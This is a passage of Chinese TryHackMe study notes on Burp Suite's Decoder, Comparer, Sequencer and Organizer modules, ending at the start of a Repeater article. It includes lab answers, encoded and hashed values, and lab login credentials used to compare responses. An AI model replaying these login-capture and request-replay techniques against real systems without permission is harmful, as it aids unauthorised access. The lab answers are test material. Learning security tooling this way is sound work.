<p>我们可以连续(堆叠)使用以上编码&#x2F;解码选项，例如，我们可以输入一个短语(“Burp Suite Decoder”)，先将其转换为ASCII Hex，然后再转换为Octal(八进制)：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230409223133686.png"
                      alt="image-20230409223133686"
                ></p>
<p>通过组合使用编码&#x2F;解码选项，能够让我们对正在编码或解码的数据实现更丰富的格式转换处理。</p>
<p>我们可以从以上内容以及示例中注意到：每个编码&#x2F;解码方法的输出结果都是以不同颜色区分的，通过比对数据的显示颜色，我们就可以快速地知道某个数据应用了什么格式的转换选项。</p>
<p><strong>Hex Format(十六进制格式)</strong></p>
<p>虽然以ASCII格式(文本格式)输入数据很方便，但是有时我们也需要逐字节编辑输入内容，为此，我们可以通过在解码选项上方选择”Hex”来使用”Hex视图”：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230409224407193.png"
                      alt="image-20230409224407193"
                ></p>
<p>如上图所示，这个视图(Hex视图)允许我们以十六进制字节格式查看和更改数据，如果我们想处理二进制文件或者其他非ASCII数据，这会是一个非常有用的技巧。</p>
<p><strong>Smart Decode(智能解码)</strong></p>
<p>最后，让我们来看看”Smart Decode-智能解码”选项，应用Decoder(解码器)的这个选项将会尝试自动解码已编码的文本。</p>
<p>例如，我们在输入框中输入<code>&amp;#x42;&amp;#x75;&amp;#x72;&amp;#x70;&amp;#x20;&amp;#x53;&amp;#x75;&amp;#x69;&amp;#x74;&amp;#x65;</code>并应用”Smart Decode-智能解码”，那么输入框中的数据内容将会被自动识别为HTML编码实体并能进行相应的解码处理。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230409232659194.png"
                      alt="image-20230409232659194"
                ></p>
<p>Burp Suite中的”Smart Decode-智能解码”功能虽然并不完美，但是此功能可以成为解码未知数据块的快速解决方案。</p>
<h3 id="答题-1"><a href="#答题-1" class="headerlink" title="答题"></a><strong>答题</strong></h3><p>关于知识学习，最好的内化方法就是付诸实践，接下来我们将尝试使用Burp Suite中的Decoder功能模块并回答相关问题。</p>
<p>使用Burp Suite的Decoder模块，以Base64格式编码短语：<code>Let&#39;s Start Simple</code>。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230410123413750.png"
                      alt="image-20230410123413750"
                ></p>
<blockquote>
<p>给定文本的Base64编码版本是：TGV0J3MgU3RhcnQgU2ltcGxl</p>
</blockquote>
<p>使用URL选项解码此数据：<code>%4e%65%78%74%3a%20%44%65%63%6f%64%69%6e%67</code>。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230410123513851.png"
                      alt="image-20230410123513851"
                ></p>
<blockquote>
<p>返回的明文内容是：Next: Decoding</p>
</blockquote>
<p>使用智能解码选项对此数据进行处理：<code>&amp;#x25;&amp;#x33;&amp;#x34;&amp;#x25;&amp;#x33;&amp;#x37;</code>。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20240103120155945.png"
                      alt="image-20240103120155945"
                ></p>
<blockquote>
<p>解码后的文本是：47</p>
</blockquote>
<p>先对文本<code>Encoding Challenge</code>进行base64编码，得到编码结果之后再将其转换为”ASCII Hex”格式，最后再继续以”Octal”编码选项转换数据格式，我们将得到一个八进制值。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230410124004080.png"
                      alt="image-20230410124004080"
                ></p>
<blockquote>
<p>最终得到的字符串内容为：24034214a720270024142d5413574712322502535521162d1206C</p>
</blockquote>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230410102251822.png"
                      alt="image-20230410102251822"
                ></p>
<h2 id="Decoder-解码器-哈希计算"><a href="#Decoder-解码器-哈希计算" class="headerlink" title="Decoder(解码器)-哈希计算"></a>Decoder(解码器)-哈希计算</h2><p>除了编码&#x2F;解码功能外，Decoder还提供了为输入的数据生成哈希和(hashsums)的选项。</p>
<p><strong>理论</strong></p>
<p>哈希计算是一个单向过程，它主要用于将数据转换为唯一的数字签名，一个函数要想成为哈希算法，那么它所生成的输出结果必须是不可逆转的。</p>
<p>在实际运用中，一个好的哈希算法能够确保每个输入的数据都会对应生成完全唯一的哈希值。例如，使用<a class="link"   href="https://en.wikipedia.org/wiki/MD5" >MD5算法 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>为文本”MD5sum”生成一个哈希和，会返回一个结果”4ae1a02de5bd02a5515f583f4fca5e8c”；而使用相同的算法处理文本”MD5SUM”，则将生成一个完全不同的哈希值”13b436b09172400c9eb2f69fbd20adad”。</p>
<p>哈希计算经常被用于验证文件和文档的完整性，因为即使对文件进行非常小的更改也会导致最后得到的Hash(哈希)值发生显著变化。</p>
<p><em><strong>注意：MD5算法的安全性并不高，它在现代应用程序中可能不会被使用。</strong></em></p>
<p>此外，哈希计算也可用于安全地存储密码值，由于哈希计算过程是单向的，这意味着通过计算得到的密码哈希值也是不可逆转的，因此，即使发生数据库泄露事件，密码哈希值也将会是(相对)安全的。</p>
<p>当用户创建密码时，应用程序可以选择对原始密码值进行哈希计算，然后以hash值的形式将密码存储在数据库中；然后，当用户尝试登录时，应用程序将对用户所提交的密码进行哈希计算，并会把得到的计算结果与存储在数据库中已有的密码哈希值进行比对，如果哈希值匹配，那么用户输入的登录密码就会被认为是正确的。</p>
<p>当一个应用程序选择使用哈希算法来处理密码值时，那么相关的数据库就不必存储原始(明文)密码，只需要存储密码所对应的哈希值即可。</p>
<p><strong>Decoder中的Hash选项</strong></p>
<p>Decoder(解码器)允许我们直接在Burp Suite内生成数据的哈希和，这与我们在前文中提到的编码&#x2F;解码选项的工作方式大致相同。具体而言，我们可以在Decoder界面的右侧边栏中点击”Hash”下拉菜单，然后从列表中选择一个hash算法来对输入数据进行哈希和计算：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20240104082321593.png"
                      alt="image-20240104082321593"
                ></p>
<p><em><strong>注意：这是一个比编码&#x2F;解码选项长得多的列表——我们可以向下滚动列表以查看更多可用的哈希算法。</strong></em></p>
<p>例如，我们先在Decoder的输入框中输入”MD5sum”，然后点击”Hash”下拉菜单并向下滚动算法列表，找到”MD5”算法选项并点击应用，这会将我们带入一个”Hex视图”(其中包含了我们的哈希计算结果)：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230410115340998.png"
                      alt="image-20230410115340998"
                ></p>
<p>如上图所示，以上哈希计算的输出结果并不会返回一个纯ASCII&#x2F;Unicode文本，因此，我们通常可以将哈希算法的输出结果继续转换为十六进制字符串，这将是我们能够经常看到的”哈希值”格式，我们可以通过对已经得到的”哈希和”应用”ASCII Hex”编码选项来完成这项工作，从而得到一个整洁的十六进制字符串。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230410122406432.png"
                      alt="image-20230410122406432"
                ></p>
<h3 id="答题-2"><a href="#答题-2" class="headerlink" title="答题"></a><strong>答题</strong></h3><p>使用Burp Suite的Decoder模块。</p>
<p>在Decoder模块中使用SHA-256算法计算<code>Let&#39;s get Hashing!</code>的哈希值，然后使用<code>ASCII Hex</code>编码选项——将得到的hash值转换为十六进制字符串：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230410124232388.png"
                      alt="image-20230410124232388"
                ></p>
<blockquote>
<p>6b72350e719a8ef5af560830164b13596cb582757437e21d1879502072238abe</p>
</blockquote>
<p>使用MD4算法计算<code>Insecure Algorithms</code>的哈希值，然后使用<code>base64</code>编码选项——将得到的hash值转换为base64格式：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230410124330068.png"
                      alt="image-20230410124330068"
                ></p>
<blockquote>
<p>TcV4QGZZN7y7lwYFRMMoeA&#x3D;&#x3D;</p>
</blockquote>
<p>下载由本文相关的TryHackMe实验房间所提供的任务文件，对文件中的四个密钥进行hash计算，找到哈希和值为<code>3166226048d6ad776370dc105d40d9f8</code>的密钥(此处使用的hash算法为MD5算法)：</p>
<p>tips：<code>wget http://MACHINE_IP:9999/AlteredKeys.zip</code></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230410124859614.png"
                      alt="image-20230410124859614"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230410125907514.png"
                      alt="image-20230410125907514"
                ></p>
<p>验证：使用MD5算法计算key3密钥的哈希和值，然后使用<code>ASCII Hex</code>编码选项——将得到的hash值转换为十六进制字符串。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230410132227986.png"
                      alt="image-20230410132227986"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230410122636364.png"
                      alt="image-20230410122636364"
                ></p>
<h2 id="Comparer-对比器-概述"><a href="#Comparer-对比器-概述" class="headerlink" title="Comparer(对比器)-概述"></a>Comparer(对比器)-概述</h2><p>顾名思义，Comparer允许我们通过ASCII字符或通过字节对比两段数据。</p>
<p>让我们先来看看Comparer的界面：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20240104083957161.png"
                      alt="image-20240104083957161"
                ></p>
<p>如上图所示，Comparer界面可分为三个主要部分：</p>
<ol>
<li>在界面左侧，会显示要比较的项目，当我们将数据加载到Comparer中时，数据将按行显示在表中，然后我们就可以选择两个数据集进行对比。</li>
<li>在界面右上角，我们可以选择从剪贴板中粘贴数据(<code>Paste</code>)、从文件中加载数据(<code>Load</code>)、删除当前行(<code>Remove</code>)、以及清除所有数据集(<code>Clear</code>)。</li>
<li>最后，在界面右下角，我们可以选择通过字符或通过字节来比较已经加载的数据集，当我们准备好对比所选数据时，就可以单击这两个按钮中的一个。</li>
</ol>
<p>与大多数Burp Suite功能模块一样，我们也可以通过右键单击并选择“发送到Comparer”来将数据从其他模块加载到对比器中。</p>
<p>当我们加载好数据(添加了至少 2 个数据集)并使用Comparer进行比较时，我们会得到一个弹出窗口，该窗口会显示数据对比的结果：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20240104084708652.png"
                      alt="image-20240104084708652"
                ></p>
<p>同样，上图的窗口也由三个不同的部分组成：</p>
<ol>
<li><p>正在对比的数据占据了上图窗口的大部分，我们可以选择以文本格式或十六进制格式来查看这些数据，窗口中的初始数据格式将根据我们在前一个窗口中选择按字符还是按字节对比来决定，但是我们也可以在上图窗口中通过点击按钮来覆盖格式。</p>
</li>
<li><p>用于数据集对比的Key位于上图窗口的左下角，此处显示了在两个数据集之间将使用哪些颜色来表示存在修改、删除和添加的数据。</p>
</li>
<li><p>在上图窗口的右下角是”Sync views-同步视图”复选框，当我们选中该复选框时，意味着两组对比数据将同步格式——即，如果你将其中一组数据更改为十六进制视图，那么另一组数据也将发生对应的变化从而形成格式同步。</p>
</li>
</ol>
<p>上图窗口的标题处还会显示已找到的差异总数。</p>
<h2 id="Comparer-对比器-示例"><a href="#Comparer-对比器-示例" class="headerlink" title="Comparer(对比器)-示例"></a>Comparer(对比器)-示例</h2><p>我们现在知道Comparer是做什么的了，但是它有什么用呢?</p>
<p>在许多情况下，Comparer能够快速比较两个(可能非常大的)数据块。</p>
<p>例如，在使用Burp Intruder执行登录框暴力破解攻击或者凭据填充攻击(撞库攻击)时，我们可能希望对比两个长度不同的响应以查看差异，而这些差异通常能够表明是否登录成功。</p>
<h3 id="实际示例"><a href="#实际示例" class="headerlink" title="实际示例"></a>实际示例</h3><p>部署目标虚拟机，并在攻击机上使用浏览器导航至： <a class="link"   href="http://10.10.197.32/support/login" >http://10.10.197.32/support/login <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>在浏览器中尝试使用无效的用户名和密码进行登录尝试——并使用Burp Proxy捕获这个登录请求。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230410200818399.png"
                      alt="image-20230410200818399"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230410200903016.png"
                      alt="image-20230410200903016"
                ></p>
<p>使用Ctrl + R将请求发送到Repeater，或者通过右键单击Proxy模块中的请求消息并选择“发送到 Repeater”。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230410200932904.png"
                      alt="image-20230410200932904"
                ></p>
<p>在Repeater中点击”Sent”发送请求，然后右键单击得到的响应消息并选择“发送到Comparer”。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230410201144206.png"
                      alt="image-20230410201144206"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230410201208524.png"
                      alt="image-20230410201208524"
                ></p>
<p>在Repeater选项卡中，将登录凭据更改为：</p>
<ul>
<li>用户名：<code>support_admin</code></li>
<li>密码：<code>w58ySK4W</code></li>
</ul>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230410201310487.png"
                      alt="image-20230410201310487"
                ></p>
<p>再次在Repeater中点击”Sent”发送请求，然后将得到的新响应消息再次转发给Comparer，最后进行数据对比(按字符对比前后两个响应，查看数据集之间的区别)。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230410201347855.png"
                      alt="image-20230410201347855"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230410201444543.png"
                      alt="image-20230410201444543"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230410201631480.png"
                      alt="image-20230410201631480"
                ></p>
<p>如上图所示，我们可以看到前后两个响应消息有9处差异。</p>
<h2 id="Sequencer-定序器-概述"><a href="#Sequencer-定序器-概述" class="headerlink" title="Sequencer(定序器)-概述"></a>Sequencer(定序器)-概述</h2><p>Sequencer允许我们评估“token-令牌”的熵(即随机性程度)——“令牌”是用于识别某些内容的字符串，理论情况下应该以加密安全的方式生成；通常我们会希望分析会话cookie的随机性或者保护表单提交的跨站请求伪造(CSRF)令牌的随机性。如果事实证明这些令牌并不是安全生成的，那么我们(理论上)可以预测之后将生成的令牌的值，想象一下，如果这个令牌是用于密码重置的，这意味着什么……</p>
<p>让我们先查看一下Sequencer界面：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20240104091318118.png"
                      alt="image-20240104091318118"
                ></p>
<p>我们有以下两种主要的方法来使用Sequencer进行token分析：</p>
<ul>
<li>Live capture(实时捕获)：实时捕获是分析令牌的两种方法中更常见的一种，也是Sequencer的默认子选项卡，实时捕获允许我们将能够生成令牌的特殊请求传递给Sequencer以供分析。例如，我们可能希望将一个传递到登录端点的POST请求转发到Sequencer，并知道服务器会使用cookie来进行响应；成功传入请求到Sequencer之后，我们就可以指示Sequencer开始实时捕获：这将自动发出数千次相同的请求，从而存储生成的大量令牌样本以供分析。一旦我们积累了足够的令牌样本，我们就可以停止Sequencer的捕获操作，并开始分析我们所捕获到的令牌。</li>
<li>Manual load(手动加载)： 手动加载允许我们将预先生成的令牌样本列表直接加载到Sequencer中进行分析，使用Manual Load意味着我们不需要向目标发出数千个请求(这既会产生大量流量记录又十分耗费资源)，但是这也意味着我们必须要获得一个包含大量预先生成的令牌的列表。</li>
</ul>
<p>在本文内容中，我们将专注于使用Live capture(实时捕获)来进行令牌分析。</p>
<h3 id="答题-3"><a href="#答题-3" class="headerlink" title="答题"></a>答题</h3><p>阅读本小节内容并回答以下问题。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20240104111827687.png"
                      alt="image-20240104111827687"
                ></p>
<h2 id="Sequencer-定序器-实时捕获"><a href="#Sequencer-定序器-实时捕获" class="headerlink" title="Sequencer(定序器)-实时捕获"></a>Sequencer(定序器)-实时捕获</h2><p>最好的学习方法就是实践，让我们通过对admin登录表单中所使用的”反暴力破解令牌”执行熵分析(随机性程度分析)来学习如何使用Sequencer实时捕获。</p>
<h3 id="实践"><a href="#实践" class="headerlink" title="实践"></a>实践</h3><p>首先部署目标实验虚拟机，然后再使用Burp Proxy捕获一个针对<a class="link"   href="http://10.10.197.32/admin/login/%E7%9A%84%E8%AF%B7%E6%B1%82%EF%BC%8C%E9%9A%8F%E5%90%8E%E5%8F%B3%E9%94%AE%E5%8D%95%E5%87%BB%E8%AF%A5%E8%AF%B7%E6%B1%82%E5%B9%B6%E9%80%89%E6%8B%A9%E2%80%9C%E5%8F%91%E9%80%81%E5%88%B0Sequencer%E2%80%9D%EF%BC%9A" >http://10.10.197.32/admin/login/的请求，随后右键单击该请求并选择“发送到Sequencer”： <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230410212135737.png"
                      alt="image-20230410212135737"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230410212219987.png"
                      alt="image-20230410212219987"
                ></p>
<p>注意，在“Token Location Within Response”部分，我们可以选择Cookie、Form field(表单字段)和Custom location(自定义位置)；在这个例子中，我们需要测试<code>loginToken</code>，所以选择“Form field”：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230410212712125.png"
                      alt="image-20230410212712125"
                ></p>
<p>在本例情况下，我们可以安全地将所有其他选项设置为默认值，然后我们直接单击“Start live capture”按钮即可：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230410213532759.png"
                      alt="image-20230410213532759"
                ></p>
<p>Sequencer界面将会弹出一个新窗口，以告诉我们正在执行实时捕获，并会显示到目前为止我们已经捕获了多少个令牌；我们需要持续等待一段时间，直到我们已经捕获到了足够多数量的令牌为止(大约10,000个就可以了)，一般而言，我们得到的令牌样本越多，我们的熵分析(随机性程度分析)就会越准确。</p>
<p>当已经捕获到了大约10,000个令牌之后，我们就可以点击“Pause-暂停”，然后选择“Analyze now-立即分析”按钮进行令牌分析：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230410214128717.png"
                      alt="image-20230410214128717"
                ></p>
<p>注意：我们也可以选择点击“Stop-停止”按钮来停止捕获，但是，最好的选择还是使用“Pause-暂停”按钮，这样做如果Sequencer报告”没有足够的样本来准确计算令牌的熵”，那么我们还可以立即恢复捕获选项。</p>
<p>如果我们想要接收令牌分析的定期结果更新，我们还可以选中“Auto analyze”复选框，这样做会告诉Burp每2000个请求左右就执行一次熵分析，然后Burp将频繁更新令牌的分析结果，这样随着更多的令牌样本被加载到Sequencer中，我们所得到的令牌分析结果也会越来越准确。</p>
<p>此外，还值得注意的是，我们可以选择复制或保存已经捕获到的令牌，以供我们稍后做进一步分析。</p>
<p>在我们点击“Analyze now-立即分析”按钮后，Burp将开始分析令牌样本的熵并生成一个报告。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20240104115152555.png"
                      alt="image-20240104115152555"
                ></p>
<h3 id="答题-4"><a href="#答题-4" class="headerlink" title="答题"></a>答题</h3><p>阅读分析报告并回答以下问题。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20240104114655552.png"
                      alt="image-20240104114655552"
                ></p>
<h2 id="Sequencer-定序器-分析"><a href="#Sequencer-定序器-分析" class="headerlink" title="Sequencer(定序器)-分析"></a>Sequencer(定序器)-分析</h2><p>承接上一小节的操作，现在我们有了一个关于”令牌-token”熵分析(随机性程度分析)的报告，是时候对其进行分析了。</p>
<p>tips：Burp会对已经捕获到的令牌样本执行数十个测试，但是我们在此不考虑这些测试背后的过程，我们将主要关注最终生成的报告摘要。</p>
<p>Sequencer所生成的”令牌-token”熵分析报告可分为四个主要部分，其中第一部分是对分析结果的摘要，它能为我们提供以下内容：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230410222507811.png"
                      alt="image-20230410222507811"
                ></p>
<ul>
<li>Overall result(总体结果)：对令牌生成机制的安全性进行广泛评估，在本例中，熵的水平表明了相关token可能是安全生成的。</li>
<li>Effective entropy(有效熵)：衡量令牌的随机性， 99位的有效熵相对较高，表明令牌具有足够的随机性，因此可以抵御预测或暴力攻击。</li>
<li>Reliability(可靠性)：1%的显著性水平意味着对结果的准确性有99%的置信度，这种置信度水平已经相当高，在一定程度上为有效熵估计的准确性提供了保证。</li>
<li>Sample(样本)：这将为我们提供在熵测试过程中所分析的令牌样本的详细信息，包括令牌的数量及其特征。</li>
</ul>
<p>总的来说，上述这些摘要内容通常足以确定令牌是否是安全生成的，然而在某些情况下，我们也可能需要做进一步调查，这可以通过”字符级分析”和”位级分析”来完成(在此不做赘述)。</p>
<p>由上述熵分析报告的摘要内容可知：最终的显著性水平为1%(有1%的错误几率)，令牌具有99位的有效熵，对于一个安全令牌来说，这会是一个很好的熵水平，我们可以说这个令牌生成机制是非常安全的。</p>
<h2 id="Organizer-组织者-概述"><a href="#Organizer-组织者-概述" class="headerlink" title="Organizer(组织者)-概述"></a>Organizer(组织者)-概述</h2><p>Burp Suite的Organizer模块旨在帮助我们存储和注释稍后可能想要重新访问的 HTTP 请求的副本，这个工具对于组织渗透测试工作流特别有用，以下是它的一些主要特性：</p>
<ul>
<li><p>使用Organizer模块，能够存储我们稍后想调查的请求、保存我们确定会感兴趣的请求或者保存我们稍后想要添加到报告中的请求。</p>
</li>
<li><p>我们可以从其他Burp模块中向Burp Organizer发送HTTP请求，该操作可通过在其他Burp模块中右键单击请求并选择点击”Send to Organizer”按钮或者使用默认的快捷键<code>Ctrl + O</code>来完成，每个发送到Organizer中的HTTP请求都是原始请求的只读副本，并且相关请求还会在我们将其发送给Organizer时自动保存。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20240104182928472.png"
                      alt="image-20240104182928472"
                ></p>
</li>
<li><p>发送到Organizer中的请求会存储在一个表中，其中包含了很多列，例如请求索引号、发出请求的时间、工作流状态、请求所来自的Burp模块、HTTP方法、服务器主机名、URL文件路径、URL查询字符串、请求中的参数数量、响应消息的HTTP状态码、响应消息的长度(以字节为单位)以及我们所做的任何注释。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20240104183755371.png"
                      alt="image-20240104183755371"
                ></p>
</li>
</ul>
<p>我们可以在Organizer界面中查看具体的请求消息和对应的响应消息：</p>
<ol>
<li>首先单击Organizer中的任意项目；</li>
<li>然后我们将看到请求视图和响应视图有对应的填充内容，此处的请求和响应都是只读的，我们还可以在请求或响应中搜索想要的信息，例如选中请求消息并使用请求视图下方的搜索栏即可。</li>
</ol>
<h3 id="答题-5"><a href="#答题-5" class="headerlink" title="答题"></a>答题</h3><p>阅读本小节内容并回答以下问题。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20240104184511207.png"
                      alt="image-20240104184511207"
                ></p>
]]></content>
      <categories>
        <category>TryHackMe笔记</category>
      </categories>
      <tags>
        <tag>TryHackMe</tag>
        <tag>工具使用</tag>
      </tags>
  </entry>
  <entry>
    <title>THM-Burp Suite：Repeater(Burp Suite重放器·更新版)-学习</title>
    <url>/2024/01/27/THM-Burp%20Suite%EF%BC%9ARepeater(Burp%20Suite%E9%87%8D%E6%94%BE%E5%99%A8%C2%B7%E6%9B%B4%E6%96%B0%E7%89%88)-%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<p>本文相关的TryHackMe实验房间链接：<a class="link"   href="https://tryhackme.com/room/burpsuiterepeater" >https://tryhackme.com/room/burpsuiterepeater <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>本文相关内容：学习如何使用 Repeater 在 Burp Suite 中重发请求。</p>
<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>在本文中，我们将重点关注Burp Suite Repeater模块以探索Burp Suite框架的高级功能，我们将学习如何使用该模块来操作和重新发送已经捕获的请求，并且将探索这个特殊模块中可用的各种选项和功能；此外，本文还会提供几个练习案例，从而巩固我们对于本文所讨论的概念的理解。</p>
<p><strong>前置学习基础</strong></p>
<p>在学习本文内容之前，建议先阅读并理解以下博客文章内容：</p>
<ul>
<li><a class="link"   href="https://www.cnblogs.com/Hekeats-L/p/17924223.html" >【THM】Burp Suite：The Basics(Burp Suite基础·更新版)-学习 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
</ul>
<p><strong>实验环境部署</strong></p>
<p>我们可以在与本文相关的Tryhackme实验房间中一键部署目标虚拟机，并且我们还能在相关的THM实验房间中使用THM官方所提供的AttackBox来作为自己的攻击机，当然使用自己的本地kali机器作为攻击机也是可以的。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20231224200822040.png"
                      alt="image-20231224200822040"
                ></p>
<h2 id="什么是Repeater？"><a href="#什么是Repeater？" class="headerlink" title="什么是Repeater？"></a>什么是Repeater？</h2><p>在开始使用Burp Suite Repeater之前，让我们先来熟悉一下它的用途和功能。</p>
<p>简而言之，Burp Suite的Repeater模块允许我们修改Burp Proxy所拦截的请求并将其转发到目标服务器；这意味着我们可以通过Repeater获取在Burp Proxy中已捕获的请求，然后对请求的内容进行编辑，并能根据渗透测试需要多次重复发送相同的请求到目标服务器。</p>
<p>tips：当然，我们也可以选择手动创建请求消息，就像我们在CLI(命令行界面)中所做的那样，使用诸如<a class="link"   href="https://curl.se/" >cURL <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>之类的工具可以手动构建和发送请求消息到目标站点。</p>
<p>这种能够多次编辑和重发请求消息的能力，使得Repeater模块适合任何类型的端点手工测试操作，Repeater为我们提供了一个图形用户界面(GUI)，这个GUI包含了可供我们编写请求消息和响应消息的多个视图区域，以便我们可以清楚地看到我们手工操作的结果。</p>
<p>Repeater界面由六个主要部分组成：</p>
<ol>
<li><p>请求列表：在Repeater选项卡界面的左上方，会显示所有Repeater请求列表，每当我们发送一个新的请求消息到Repeater中时，此处的请求列表就会增加。</p>
</li>
<li><p>请求控件：在请求列表的正下方，有一些可以控制当前请求消息的控件，这些控件允许我们发送请求、取消挂起的请求以及浏览历史请求记录。</p>
</li>
<li><p>请求和响应视图：在Repeater选项卡界面左边的大部分区域，可以看到请求视图和响应视图，我们可以在request视图中编辑请求消息，然后点击Send发送请求到目标站点，随后与请求消息相对应的响应消息就会显示在response视图中。</p>
</li>
<li><p>布局选项：在request&amp;response视图的右上角处，有一组设置选项，能够允许我们更改请求视图和响应视图的布局；在默认情况下，请求视图和响应视图通常是并排显示(水平布局)，但是我们也可以选择将这两个视图上下排列显示(垂直布局)，或者将请求视图和响应视图组合在单独的选项卡中(组合视图)。</p>
</li>
<li><p>检查器：在Repeater选项卡界面的右侧，有一个Inspector界面，Inspector允许我们将请求消息(以及响应消息)分解，从而以一种更直观的方式来分析和编辑请求消息的内容。</p>
</li>
<li><p>目标：最后，在Inspector的上方，我们可以找到Target部分，Target就是我们所要发送的请求的目标IP地址或目标域，当我们从Burp Suite的其他部分发送请求消息到Repeater中时，Target中的字段将会自动填充。</p>
</li>
</ol>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20231224202015697.png"
                      alt="image-20231224202015697"
                ></p>
<h3 id="答题"><a href="#答题" class="headerlink" title="答题"></a><strong>答题</strong></h3><p>阅读本小节内容，并回答以下问题：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20231224202722399.png"
                      alt="image-20231224202722399"
                ></p>
<h2 id="Repeater的基础用法"><a href="#Repeater的基础用法" class="headerlink" title="Repeater的基础用法"></a>Repeater的基础用法</h2><p>我们现在知道了Repeater选项卡的界面是什么样子，但是我们该如何使用它呢?</p>
<p>虽然我们可以选择手动创建请求消息，但是更常见的方法是使用Burp Proxy功能模块来捕获请求，然后将被捕获的请求消息发送到Repeater中进行编辑和重发。</p>
<p>在Burp Proxy中捕获到请求后，我们可以通过右键单击请求消息并选择“Send to Repeater”或者按下<code>Ctrl + R</code>快捷键将请求消息发送到Repeater中：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230409100210962.png"
                      alt="image-20230409100210962"
                ></p>
<p>现在，当我们切换到Repeater界面时，就可以在Repeater界面的请求视图中看到可用的请求消息：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230408220445196.png"
                      alt="image-20230408220445196"
                ></p>
<p>如上图所示，我们可以看到Target区域和Inspector界面也显示了相关信息，但是我们还没有看到响应消息，所以我们可以选择点击”Send”按钮，然后响应视图部分就会被响应消息的内容快速填充：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230408221137800.png"
                      alt="image-20230408221137800"
                ></p>
<p>如果我们想要修改请求消息的内容，我们可以直接在请求视图中进行信息修改，然后再次点击”Send”按钮，这将更新响应视图中的内容。例如，我们可以将上图请求中的”Connection”报头的值修改为”<code>open</code>“而不是”<code>close</code>“，然后发送该请求，这样会导致响应消息中的”Connection”报头的值变为”<code>keep-alive</code>“：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230408221756766.png"
                      alt="image-20230408221756766"
                ></p>
